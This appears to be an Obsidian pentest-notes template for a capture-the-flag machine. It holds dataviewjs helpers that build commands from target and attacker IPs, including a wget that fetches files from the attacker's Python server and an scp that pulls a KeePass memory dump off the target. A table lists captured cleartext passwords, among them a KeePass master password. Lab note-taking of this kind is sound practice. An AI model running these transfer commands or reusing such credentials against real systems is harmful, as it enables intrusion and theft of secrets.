[IP]
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Editing Box

```
scp lnorgaard@10.129.229.41:/home/lnorgaard/KeePassDumpFull.dmp .
```

wget from local python server

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```


## Provided Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---


## Open Ports
---

| Port | Service | Notes |
| ---- | ------- | ----- |
| 22   | SSH     |       |
| 80   | HTTP    |       |
|      |         |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username  | Password          | Notes           |
| --------- | ----------------- | --------------- |
| lnorgaard | Welcome2023!      |                 |
|           | rødgrød med fløde | Master Password |
|           | F4><3K0nd!        |                 |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```